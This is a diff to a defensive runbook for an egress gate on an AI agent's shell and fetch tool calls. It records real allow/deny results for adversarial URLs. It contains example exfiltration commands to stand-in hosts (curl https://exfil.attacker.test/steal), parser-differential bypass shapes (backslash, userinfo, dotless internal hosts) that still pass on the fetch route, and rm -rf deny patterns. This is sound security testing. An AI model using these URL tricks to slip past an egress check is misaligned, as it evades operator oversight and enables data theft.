@@ -15,6 +15,13 @@ one half is *AGT's gate reading ACS's own field*, and the other is *AGT's gate r
 this deployment originated*. A demo that showed only one of them would be claiming the other for
 free.
 
+**"One gate" is not "one verdict", and §5 measures where the two routes part.** Because the shell
+route originates its destination and the fetch route does not, the shell route can decline to answer
+where the fetch route cannot. After this branch's final round it does, and the shell route is the
+**stricter** of the two: it denies every adversarial shape §5 tests, while the fetch route allows
+four of them, on a parse held byte-identical by `bun run verify:pin`. The two routes reach the same
+gate; they do not reach the same answer.
+
 This runbook is written from real runs against this tree. **Nothing below is composed or
 hand-edited: every block is pasted from an actual run.**
 
@@ -28,11 +35,17 @@ behaviour while claiming to demonstrate this slice.
 
 **Two subsections of §5 are later, and say so where they appear.** The blocks under *A URL the gate
 itself mis-parses* and *Every shell command that mentions a URL* were captured during this branch's
-final review round, against a Guardian started the same way from commit `0dabe6e` of this tree, on
-**port 8799**. They are the only blocks in this file taken from a different process, and they
+final review rounds, against a Guardian started the same way from commit `ca4aa2e` of this tree, on
+**port 8801**. They are the only blocks in this file taken from a different process, and they
 measure changes to `annotateEgressDestination` that `16a3ab0` does not contain — which is exactly
 why they are not presented as if they came from the run above. Section 2's policy-input block was
 re-run against the same commit, because what lands at the annotation path changed with them.
+
+Those subsections have now been re-captured three times, once per generation of
+`annotateEgressDestination`, and the file records only the current one. Earlier ports named in this
+paragraph's history — 8791, 8799 — belong to processes that are gone; if a block below names a port,
+it is 8791 for §1–§4's wire captures and 8801 for the §5 subsections and §2's policy-input block,
+with nothing in between.
 
 ## Prerequisites
 
@@ -95,10 +108,10 @@ git diff be5ab38..HEAD -- policy/lib/data.json
 
 ```diff
 diff --git a/policy/lib/data.json b/policy/lib/data.json
-index 1787ea9..13ac0b7 100644
+index 1787ea9..bcd7e25 100644
 --- a/policy/lib/data.json
 +++ b/policy/lib/data.json
-@@ -2,6 +2,9 @@
+@@ -2,10 +2,15 @@
    "agt": {
      "defaults": {
        "config": {
@@ -108,9 +121,21 @@ index 1787ea9..13ac0b7 100644
          "patterns": {
            "patterns": [
              "(?i)rm\\s+-[a-z]*r[a-z]*f[a-z]*\\s+/(?:\\s|$)",
+-            "(?i)rm\\s+-[a-z]*f[a-z]*r[a-z]*\\s+/(?:\\s|$)"
++            "(?i)rm\\s+-[a-z]*f[a-z]*r[a-z]*\\s+/(?:\\s|$)",
++            "(?i)rm\\s+-[a-z]*r[a-z]*f[a-z]*\\s+\\.\\.?/?(?:\\s|$)",
++            "(?i)rm\\s+-[a-z]*f[a-z]*r[a-z]*\\s+\\.\\.?/?(?:\\s|$)"
+           ],
+           "reason": "destructive_shell_command_blocked"
+         },
 ```
 
-One key. `be5ab38` is this slice's last commit before any code existed.
+One key — the `egress` object. `be5ab38` is this slice's last commit before any code existed.
+
+The two `rm` patterns the same hunk shows being added are **not this slice's**: they arrived in a later
+commit hardening the destructive-command list against a relative path, and they touch no gate this file
+measures. They appear here only because they sit inside the same three lines of diff context. The block
+is the real output of the command above it, so they are shown rather than trimmed.
 
 **The allowed fetch.**
 
@@ -350,6 +375,7 @@ async function show(command: string): Promise<void> {
 await show("curl https://exfil.attacker.test/steal");
 await show("curl https://docs.anthropic.com/x");
 await show("curl https://metadata?x=@docs.anthropic.com");
+await show("curl https://docs.anthropic.com\\@evil.test/steal");
 await show("echo hi");
 ```
 
@@ -368,21 +394,32 @@ raw_command        "curl https://metadata?x=@docs.anthropic.com"
 input.annotations  {"egress":{"destination":"https://metadata"}}
 verdict            {"decision":"deny","reason":"egress_destination_not_allowed","message":"destination metadata not in allowlist [\"*.anthropic.com\", \"docs.example.com\"]"}
 
+raw_command        "curl https://docs.anthropic.com\\@evil.test/steal"
+input.annotations  {"egress":{"destination":"https://unresolved.invalid"}}
+verdict            {"decision":"deny","reason":"egress_destination_not_allowed","message":"destination unresolved.invalid not in allowlist [\"*.anthropic.com\", \"docs.example.com\"]"}
+
 raw_command        "echo hi"
 input.annotations  {"egress":{}}
 verdict            {"decision":"allow","result_labels":["public"]}
 
 ```
 
-Four things a reader can check here rather than believe. The destination lands at
+Five things a reader can check here rather than believe. The destination lands at
 `input.annotations.egress.destination` — one of the five entries in the `default_destination_paths`
 array quoted at the top of this file, published by AGT and not invented on this side. What lands
 there is an **origin**, not the command's URL: `https://exfil.attacker.test`, where the command
 said `https://exfil.attacker.test/steal`. The verdict the gate reaches from it is the same verdict
-the wire carried in the two `curl` captures above, `message` and all. The third row is the shape
-§5 is about — the command names `metadata`, trailed by an allowlisted name inside a query, and what
-reaches the gate is `https://metadata`, which it denies. And the fourth is the answer for a command
-with no destination in it: `{}`, not an error and not a guess — also §5's subject.
+the wire carried in the two `curl` captures above, `message` and all. The third row is one of the
+shapes §5 is about — the command names `metadata`, trailed by an allowlisted name inside a query,
+and what reaches the gate is `https://metadata`, which it denies.
+
+**The fourth row is the one to read twice, and §5 is entirely about it.** What lands at the
+annotation path is not a host at all: it is `https://unresolved.invalid`, a name RFC 2606 reserves
+so that it can never resolve and can never be legitimately allowlisted. The Guardian answers it
+whenever it cannot tell which host a command line reaches, and the gate then denies — because the
+one thing it must not do there is answer *nothing*. And the fifth row shows why that distinction
+matters: a command with no destination in it annotates `{}`, the gate resolves nothing, and the
+call **allows**. Silence at this path is an allow. Refusing has to be spelled.
 
 ### What the manifest had to say for this to happen at all
 
@@ -711,13 +748,65 @@ fix below, on both routes. Dotless hosts are internal names — `metadata`, `int
 precisely the class an egress gate is deployed for, so this is the shape that matters most and the
 one that looks least alarming.
 
+#### Three parsers, three answers, and why the shell route stopped trying to compute one
+
+The rows above are all `host_of()`'s blind spots, and for a while the fix for them was to hand
+`host_of()` a value it could not misread: a parsed **origin**, which cannot carry a userinfo, a
+query or a fragment. That closed all seven. It also introduced a shape none of the earlier rounds
+had allowed — the first time this deployment answered an **allowlisted** host for a destination that
+was not allowlisted.
+
+A backslash is the whole of it. Three parsers see `https://docs.anthropic.com\@evil.test/steal`
+three different ways:
+
+```bash
+OPA=node_modules/.bun/agent-control-specification-opa-darwin-arm64@0.3.1-beta.0/node_modules/agent-control-specification-opa-darwin-arm64/bin/opa
+U='https://docs.anthropic.com\@evil.test/steal'
+printf 'WHATWG new URL(...).origin  %s\n' "$(bun -e 'console.log(new URL(process.argv[1]).origin)' "$U")"
+printf 'AGT host_of(...)            %s\n' "$(jq -cn --arg u "$U" '{u:$u}' | "$OPA" eval -d policy/lib/egress.rego -I -f raw 'data.agt.egress.host_of(input.u)')"
+printf 'curl, after the shell       %s\n' "$(curl -s -o /dev/null --proxy http://127.0.0.1:1 -w '%{url.host}' $U)"
+```
+
+```
+WHATWG new URL(...).origin  https://docs.anthropic.com
+AGT host_of(...)            docs.anthropic.com\@evil.test
+curl, after the shell       evil.test
+```
+
+Read the third line's command carefully: `$U` is **unquoted**, so bash removes the backslash before
+`curl` is invoked — which is exactly what happens when an agent runs the command. `--proxy
+http://127.0.0.1:1` points curl at a port nothing listens on, so this is curl's own parse of the URL
+and **no request leaves the machine**; `%{url.host}` is filled in before any connection is
+attempted.
+
+So a WHATWG parse answers the allowlisted `docs.anthropic.com`, because WHATWG treats `\` as `/` in
+a special scheme and ends the authority there. `curl` treats `\` as an ordinary host character and
+never sees it anyway. **The destination reached is `evil.test`, and the annotation said
+`docs.anthropic.com`.**
+
+There is no delimiter rule that repairs this, and that is the finding rather than the bug.
+Computing "the host this command will reach" from a **pre-shell** command line requires a shell
+parser and curl's parser, and the Guardian has neither. Four rounds of trying produced four
+different bypasses.
+
+**So the shell route stopped computing and started refusing.** The annotator now recognises only the
+authority shapes on which no parser could disagree — a plain host, an optional numeric port, ending
+at `/`, `?`, `#` or the end of the token — and answers everything else with
+`https://unresolved.invalid`, the RFC 2606 reserved name from §2's fourth row. The gate denies it,
+because no allowlist can cover it.
+
+The half of that which is easy to get wrong: **answering `{}` for an ambiguous input would be an
+allow.** With no destination the gate resolves nothing, is undefined, and the call falls through.
+`{}` is kept only where the command carries no URL at all — "no opinion" — never where the module
+cannot tell.
+
 **The blocks in this subsection and the next were captured after the rest of this file**, against a
-Guardian started the same way from commit `0dabe6e` of this tree, on **port 8799** rather than 8791
+Guardian started the same way from commit `ca4aa2e` of this tree, on **port 8801** rather than 8791
 — a fresh process on its own port, for the same reason the setup section names a port at all.
 Substitute whichever port your own Guardian printed.
 
 ```bash
-ACS=http://localhost:8799/acs
+ACS=http://localhost:8801/acs
 ask() {  # ask <request_id> <json payload>
   jq -cn --arg r "$1" --argjson p "$2" '{jsonrpc:"2.0",id:1,method:"steps/toolCallRequest",params:{
     acs_version:"0.1.0",request_id:$r,timestamp:"2026-08-18T00:00:00Z",
@@ -731,10 +820,21 @@ for u in 'https://exfil.attacker.test/steal' \
          'https://evil.test?x=a@docs.anthropic.com' \
          'https://evil.test#a@docs.anthropic.com' \
          'https://metadata?x=@docs.anthropic.com' \
-         'https://internal-api#@docs.anthropic.com'; do
+         'https://internal-api#@docs.anthropic.com' \
+         'https://evil?x=@docs.anthropic.com' \
+         'https://docs.anthropic.com\@evil.test/steal' \
+         'https://docs.example.com\@exfil.attacker.test/steal' \
+         'https://docs.anthropic%2ecom/x' \
+         'https://EVIL.TEST/x' \
+         'https://docs.anthropic.com.evil.test/x' \
+         'https://evil.test:8443/x' \
+         'https://docs.anthropic.com/x' \
+         'https://DOCS.ANTHROPIC.COM/x' \
+         'https://docs.anthropic.com:443/x' \
+         'https://docs.example.com/y'; do
   n=$((n+1))
-  fetch=$(ask "e0000000-0000-4000-8000-00000000000$n" "$(jq -cn --arg u "$u" '{tool:{name:"WebFetch"},arguments:{url:{value:$u}}}')")
-  shell=$(ask "e0000000-0000-4000-8000-00000000010$n" "$(jq -cn --arg u "$u" '{tool:{name:"Bash"},arguments:{command:{value:("curl "+$u)}},raw_command:("curl "+$u)}')")
+  fetch=$(ask "e0000000-0000-4000-8000-$(printf '%012d' $n)" "$(jq -cn --arg u "$u" '{tool:{name:"WebFetch"},arguments:{url:{value:$u}}}')")
+  shell=$(ask "e0000000-0000-4000-8000-$(printf '%012d' $((100+n)))" "$(jq -cn --arg u "$u" '{tool:{name:"Bash"},arguments:{command:{value:("curl "+$u)}},raw_command:("curl "+$u)}')")
   printf '%-55s  fetch: %-5s | shell: %s\n' "$u" "$fetch" "$shell"
 done
 ```
@@ -747,35 +847,57 @@ https://evil.test?x=a@docs.anthropic.com                 fetch: deny  | shell: d
 https://evil.test#a@docs.anthropic.com                   fetch: deny  | shell: deny
 https://metadata?x=@docs.anthropic.com                   fetch: allow | shell: deny
 https://internal-api#@docs.anthropic.com                 fetch: allow | shell: deny
+https://evil?x=@docs.anthropic.com                       fetch: allow | shell: deny
+https://docs.anthropic.com\@evil.test/steal              fetch: deny  | shell: deny
+https://docs.example.com\@exfil.attacker.test/steal      fetch: deny  | shell: deny
+https://docs.anthropic%2ecom/x                           fetch: deny  | shell: deny
+https://EVIL.TEST/x                                      fetch: deny  | shell: deny
+https://docs.anthropic.com.evil.test/x                   fetch: deny  | shell: deny
+https://evil.test:8443/x                                 fetch: deny  | shell: deny
+https://docs.anthropic.com/x                             fetch: allow | shell: allow
+https://DOCS.ANTHROPIC.COM/x                             fetch: deny  | shell: allow
+https://docs.anthropic.com:443/x                         fetch: allow | shell: allow
+https://docs.example.com/y                               fetch: allow | shell: allow
 ```
 
-**The shell route is closed here — every one of the seven shapes above reads `shell: deny`. The
-fetch route is not, and the asymmetry is not an oversight.**
+**Fourteen adversarial shapes and four allowlisted controls. The shell route denies every one of the
+fourteen and allows all four controls. The fetch route allows four of the fourteen.**
+
+**The two routes are not symmetric, and after this change the shell route is the stricter of the
+two.** A reader who takes "one gate, two routes" to mean the two routes decide alike is reading
+something this file does not claim. The four rows that read `fetch: allow` are destinations that go
+somewhere the allowlist does not cover — `exfil.attacker.test`, `metadata`, `internal-api` and
+`evil` respectively, measured with `curl -w '%{url.host}'` — and there is nothing on that route to
+close them with.
 
 On the shell route, the Guardian *chooses* the string it hands the gate: `raw_command` is a command
-line, and `annotateEgressDestination` decides what destination to answer with. It parses that URL
-and answers with its **origin** — scheme, host and port, and nothing else. An origin cannot carry a
-userinfo, a query or a fragment *by construction*, so every shape in the table above collapses to
-the host the request actually reaches, and the only job left for `host_of()` is splitting the port
-off, which it does correctly. That is a correction to this side's own input, not to AGT's parser.
-The verdict, in full:
+line, and `annotateEgressDestination` decides what destination to answer with. On the fetch route
+there is no such seam. `args.url` is the **first** entry in the gate's own
+`default_destination_paths` — the same property section 1 celebrates as costing no code — so the
+tool's argument reaches `host_of()` with nothing in between. Correcting the parse would mean
+editing `policy/lib/egress.rego`, and *not editing a `.rego`* is this slice's central claim, held
+mechanically by `bun run verify:pin`. So the fetch half is published rather than fixed. A fetch tool
+is the likelier route to a URL an attacker supplied, which is worth saying plainly rather than
+leaving to be inferred from a column.
+
+The verdict on the shell route, in full, for the shape that produced this round:
 
 ```bash
-curl -s -X POST http://localhost:8799/acs \
+curl -s -X POST http://localhost:8801/acs \
   -H 'content-type: application/json' \
-  -d '{"jsonrpc":"2.0","id":202,"method":"steps/toolCallRequest","params":{"acs_version":"0.1.0","request_id":"bb000002-0000-4000-8000-000000000002","timestamp":"2026-08-18T00:00:00Z","metadata":{"agent_id":"demo","session_id":"5c9a4d21-7e83-4f06-9b1d-2a6c8e4f0d75"},"payload":{"tool":{"name":"Bash"},"arguments":{"command":{"value":"curl https://docs.anthropic.com:pw@exfil.attacker.test/steal"}},"raw_command":"curl https://docs.anthropic.com:pw@exfil.attacker.test/steal"}}}' | jq .
+  -d '{"jsonrpc":"2.0","id":204,"method":"steps/toolCallRequest","params":{"acs_version":"0.1.0","request_id":"bb000004-0000-4000-8000-000000000004","timestamp":"2026-08-18T00:00:00Z","metadata":{"agent_id":"demo","session_id":"5c9a4d21-7e83-4f06-9b1d-2a6c8e4f0d75"},"payload":{"tool":{"name":"Bash"},"arguments":{"command":{"value":"curl https://docs.anthropic.com\\@evil.test/steal"}},"raw_command":"curl https://docs.anthropic.com\\@evil.test/steal"}}}' | jq .
 ```
 
 ```json
 {
   "jsonrpc": "2.0",
-  "id": 202,
+  "id": 204,
   "result": {
     "type": "final",
     "acs_version": "0.1.0",
-    "request_id": "bb000002-0000-4000-8000-000000000002",
+    "request_id": "bb000004-0000-4000-8000-000000000004",
     "decision": "deny",
-    "reasoning": "This step was decided by AGT's stock policy bundle. Policy: egress_destination_not_allowed, from AGT's stock bundle (agt_stock). AGT reported: destination exfil.attacker.test not in allowlist [\"*.anthropic.com\", \"docs.example.com\"].",
+    "reasoning": "This step was decided by AGT's stock policy bundle. Policy: egress_destination_not_allowed, from AGT's stock bundle (agt_stock). AGT reported: destination unresolved.invalid not in allowlist [\"*.anthropic.com\", \"docs.example.com\"].",
     "reason_codes": [
       "egress_destination_not_allowed"
     ],
@@ -789,9 +911,16 @@ curl -s -X POST http://localhost:8799/acs \
 }
 ```
 
-**This took three tries, and the two that failed are the reason it is a parse and not a pattern.**
-Recorded here rather than quietly corrected, because a normalisation that re-opens the class it was
-written to close is worth a reader's time.
+**The deny message names `unresolved.invalid`, not a host, and that is a real loss of information.**
+It is the price of not claiming to know which host the command reaches, and it is the message an
+operator will see for every ambiguous input. The command itself is unchanged in the audit envelope —
+the envelope sink writes both directions, so `raw_command` is recoverable from the log the setup
+block names — and the module's own doc comment carries this explanation for whoever greps the
+string.
+
+**This took four tries, and the three that failed are the reason it now refuses rather than
+computes.** Recorded here rather than quietly corrected, because a normalisation that re-opens the
+class it was written to close is worth a reader's time.
 
 - **First**, the URL was handed over as matched. That is the colon-bearing userinfo row: allowed.
 - **Second**, a userinfo strip bounded at the first `/`. Right for a URL with a path; on a
@@ -802,41 +931,46 @@ written to close is worth a reader's time.
 - **Third**, the same strip bounded at `/`, `?` and `#`. That fixed rows four and five and left
   rows six and seven untouched, because the dotless-host shape is not about the bound at all — the
   strip correctly declines to strip, and the *gate* is what mis-reads what it is handed.
+- **Fourth**, `new URL(...).origin` — a real parse instead of a hand-rolled one, which closed all
+  seven rows above and opened the backslash row: the first answer this module ever gave that was
+  both **allowlisted** and wrong. The three before it under-informed the gate; this one misinformed
+  it.
 
-Three rounds, three shapes. What they have in common is a hand-rolled parse, so the parse is no
-longer hand-rolled: `new URL(...).origin`, with the throw caught and answered `{}` so the function
-stays total. Nothing bespoke is left beside it — two answers to "what is the host" is the same
-two-declarations-of-one-fact hazard this slice removed from the policy-target argument.
+Four rounds, four shapes. What they have in common is not a missing delimiter — it is that each was
+still trying to *compute* an answer that a pre-shell command line does not determine. So the module
+stopped: it recognises the shapes nobody disagrees about, and refuses the rest.
 
-The table above is the re-capture from that build, and every shape in it is pinned by its own test:
-plain userinfo, colon-bearing userinfo, an `@` in a path, an `@` in a query, an `@` in a fragment, a
-userinfo genuinely ahead of a query, the three dotless hosts, a port, and a match the parser rejects
-answering `{}` rather than throwing.
+The table above is the re-capture from that build, and every shape in it is pinned by its own test.
+Beyond those, the module's suite carries a **differential corpus**: eighteen adversarial command
+lines pinned against the host `curl` itself resolves, regenerated by
+`scripts/regenerate-curl-resolved-hosts.sh` through the same dead-proxy measurement shown above. The
+rule it asserts is that the annotator answers curl's host or refuses — never a third host, and never
+an allowlisted one. That is the guard the four rounds above did not have: each of them added cases
+for the shape it was shown, and each missed the next.
 
-**Two effects worth stating because they are not denials.** A URL parse lowercases the host, and the
-allowlist glob is case-sensitive — so `curl https://DOCS.ANTHROPIC.COM/x` **denied** before this
-change and **allows** after it. That is correct, since DNS is case-insensitive and the request
-reaches the allowlisted host either way, but it is a widening and is recorded as one. The controls
-that stop it being read as "case no longer matters" were measured beside it:
+**Three effects worth stating because they are not straightforward denials.** A URL parse lowercases
+the host, and the allowlist glob is case-sensitive — so `curl https://DOCS.ANTHROPIC.COM/x` **denies
+on the fetch route and allows on the shell route**, visible as the one row of the table where the
+shell route is the more permissive of the two. That is correct, since DNS is case-insensitive and
+the request reaches the allowlisted host either way, but it is a widening and is recorded as one.
 `curl https://EVIL.TEST/x` still denies, and so does `curl https://docs.anthropic.com.evil.test/x`.
-And the path, query and fragment are now discarded before the gate sees them, which costs nothing
+
+Second, **`https://docs.anthropic%2ecom/x` now denies on both routes, and `curl` resolves it to
+`docs.anthropic.com`**, which the allowlist covers. A percent-escape is decoded inside a host by a
+WHATWG parse and not by `host_of()`, so it is exactly the kind of disagreement the shell route
+refuses to arbitrate — and refusing means denying. It is a genuine over-block, it belongs with the
+`echo` over-block in the next subsection, and it is the direction this deployment chooses to fail
+in.
+
+Third, the path, query and fragment are discarded before the gate sees them, which costs nothing
 today — the gate consults only `host_of(dest)` — and would cost something only to a deployment that
 pointed `cfg.egress.destination_paths` at a rule expecting a whole URL. This repository ships no
 such path.
 
-On the fetch route there is no such seam. `args.url` is the **first** entry in the gate's own
-`default_destination_paths` — the same property section 1 celebrates as costing no code — so the
-tool's argument reaches `host_of()` with nothing in between. Correcting the parse would mean
-editing `policy/lib/egress.rego`, and *not editing a `.rego`* is this slice's central claim, held
-mechanically by `bun run verify:pin`. So the fetch half is published rather than fixed — and the
-table shows it costs **three** live shapes, not one: the colon-bearing userinfo and both dotless
-hosts read `fetch: allow`. A fetch tool is the likelier route to a URL an attacker supplied, which
-is worth saying plainly rather than leaving to be inferred from a column.
-
-The shell route's own denials also name the right host now, which the earlier rounds did not.
-`https://docs.anthropic.com@exfil.attacker.test/steal` was denied before this work too, but for the
-host `docs.anthropic.com@exfil.attacker.test` — right verdict, wrong question, which is not the same
-as being decided about correctly.
+The shell route's own denials also name the right host now, wherever it names a host at all, which
+the earlier rounds did not. `https://docs.anthropic.com@exfil.attacker.test/steal` was denied before
+this work too, but for the host `docs.anthropic.com@exfil.attacker.test` — right verdict, wrong
+question, which is not the same as being decided about correctly.
 
 ### Every shell command that *mentions* a URL is decided about, and this allowlist denies most of them
 
@@ -846,7 +980,7 @@ command never dereferences looks exactly like a `curl` to it. The shipped allowl
 reachable entry, so in this deployment that reads as **deny any shell command mentioning a URL**:
 
 ```bash
-ACS=http://localhost:8799/acs
+ACS=http://localhost:8801/acs
 n=0
 while IFS= read -r c; do
   n=$((n+1))
@@ -880,6 +1014,12 @@ under-blocking — and it is a **live operational consequence**, not a hypotheti
 tells a reader to copy the widened `settings.json`, and this repository's own `.claude/settings.json`
 already carries it. Turn this on and the `git clone` and `pip install -i` above stop, with a policy
 reason attached, in an ordinary working session.
+
+`https://docs.anthropic%2ecom/x` from the previous subsection is a second over-block of the same
+family and a narrower one: there the command *does* reach an allowlisted host, and it denies anyway
+because the annotator will not adjudicate a percent-escape. Two different causes — a URL that is
+mentioned rather than reached, and a URL that is reached but not vouched for — and the same
+direction of failure.
 
 Neither obvious re-tuning is taken, and both refusals are deliberate. Widening the allowlist is not
 available: it is what every capture in this file is measured against, and editing it would
@@ -934,10 +1074,10 @@ git diff be5ab38..HEAD --stat -- policy/
 ```
 
 ```
- policy/lib/data.json       |   3 ++
+ policy/lib/data.json       |   7 ++-
  policy/manifest.drift.yaml |  33 ++++++++++++-
  policy/manifest.yaml       | 121 ++++++++++++++++++++++++++++++++++++++-------
- 3 files changed, 138 insertions(+), 19 deletions(-)
+ 3 files changed, 141 insertions(+), 20 deletions(-)
 ```
 
 Two manifests and one config document. Not one line of the twenty-two `.rego` files in
@@ -953,9 +1093,11 @@ exactly as much as the reader's willingness to believe it.
 every section* above: `ACS_GUARDIAN_PORT=8791` with `ACS_ENVELOPE_LOG=.acs/v9-runbook.jsonl`. Each
 `curl` in this file is complete and self-contained — fixed `request_id`s, fixed bodies, nothing
 elided — so the responses are comparable field for field, not merely in shape. "Ten" counts the
-numbered `curl` blocks of sections 1–5; the two §5 subsections added in the final review round
+numbered `curl` blocks of sections 1–5; the two §5 subsections captured in the final review rounds
 contribute their own requests on top, through the two `bash` loops printed there and one further
-`curl` block, and those loops carry fixed `request_id`s for the same reason.
+`curl` block, and those loops carry fixed `request_id`s for the same reason. Those add **42**
+distinct requests: 36 from the both-routes loop (18 URLs × 2 routes), 5 from the "mentions" loop,
+and 1 from the full-deny block.
 
 **2. Then check them against the Guardian's own record, not against your terminal scrollback.** The
 envelope sink writes one JSONL line per envelope crossing the wire, in **both** directions, before
@@ -968,8 +1110,10 @@ jq -c 'select(.direction == "response") | .envelope' .acs/v9-runbook.jsonl | sor
 
 `sort -u` is the point. Run the ten requests several times and the log grows, but the number of
 *distinct* response envelopes must stay at ten — one per request — because every field that varies
-run to run is fixed in the request bodies. Run the two §5 loops as well and the distinct count
-rises by their requests and then stops rising, for the same reason and no other. That is what makes the log a check on this file rather
+run to run is fixed in the request bodies. Run the two §5 loops and the full-deny block as well and
+the distinct count rises to their 42 and then stops rising, for the same reason and no other.
+Measured on the port-8801 Guardian that produced those blocks: 42 distinct responses, and re-running
+the loops did not move it. That is what makes the log a check on this file rather
 than an echo of it: it is written by the Guardian process, from the port named on its own command
 line, and it cannot contain a response some other process gave.
 
@@ -979,9 +1123,10 @@ your copy starts empty and fills as you run.
 
 **3. The blocks that are not wire traffic** each name the command that produced them, right where
 they appear: `git diff be5ab38..HEAD` for the two `policy/` blocks, `opa eval` for the `host_of`
-rows, `bun run verify:pin` for the pin, and — for the policy-input block, the pre-slice `mapVerdict`
-comparison and the missing-`by_tool`-row deny — a short script printed or described in full beside
-its output.
+rows, the three-line `printf` block for the three-parser comparison — whose `curl` is pointed at a
+dead local proxy, so re-running it sends nothing — `bun run verify:pin` for the pin, and — for the
+policy-input block, the pre-slice `mapVerdict` comparison and the missing-`by_tool`-row deny — a
+short script printed or described in full beside its output.
 
 **4. One field will not match, and only one:** `verify:pin`'s bracketed wall-clock time, which the
 pin section already records varying across three runs. Everything else in this file is expected to
@@ -990,7 +1135,8 @@ tree it was captured from.
 
 ## What this file is, and is not
 
-This file is the **evidence** — real runs against a Guardian started from commit `16a3ab0`, pasted
+This file is the **evidence** — real runs against a Guardian started from commit `16a3ab0` for
+§1–§4, and from `ca4aa2e` for §2's policy-input block and §5's last two subsections, pasted
 verbatim. It does not declare this slice's scope, what it commits to, or what it leaves open; that
 declaration lives in [`slices/v9/README.md`](../../slices/v9/README.md) and, authoritatively, in
 [`docs/shaping/acs-reference-impl-slices.md`](../shaping/acs-reference-impl-slices.md) §V9.
